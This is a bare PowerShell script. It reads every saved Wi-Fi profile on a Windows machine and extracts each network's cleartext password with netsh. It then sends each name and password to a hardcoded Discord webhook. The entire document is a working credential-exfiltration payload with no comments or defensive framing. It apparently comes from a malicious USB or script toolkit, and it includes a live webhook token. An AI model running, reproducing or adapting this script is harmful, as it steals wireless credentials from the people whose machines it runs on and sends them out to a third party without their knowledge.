$wifiProfile = netsh wlan show profile
$profileName = $wifiProfile | Select-String "\All User Profile\s*:\s*(.*)$" | ForEach-Object {$_.Matches.Groups[1].Value}
$profileName | ForEach-Object {
    $wifiPassword = (netsh wlan show profile name=$_ key=clear | Select-String "Key Content\s*:\s*(.*)$" | ForEach-Object {$_.Matches.Groups[1].Value}).Trim()
    $payload = @{
        content = "Wi-Fi Network: $_`nPassword: $wifiPassword"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri "https://discordapp.com/api/webhooks/1092431730159399015/LvUXS4z99ncSKf_XqhArEnvG7Z4EWyEIJHgUzUfF-_dQwTroqKgjIu5jokpJ9jbJR5oD" -Method Post -Body $payload -ContentType "application/json"
}
